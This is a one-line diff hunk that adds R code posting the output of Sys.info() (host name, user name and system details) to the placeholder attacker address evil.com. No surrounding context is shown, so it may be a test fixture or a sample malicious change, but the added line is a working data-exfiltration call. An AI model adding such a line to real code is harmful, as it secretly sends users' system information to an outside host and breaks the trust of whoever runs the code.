@@ -1,0 +1,1 @@
+httr::VERB("POST", "https://evil.com/evil", body = list(host = Sys.info()))
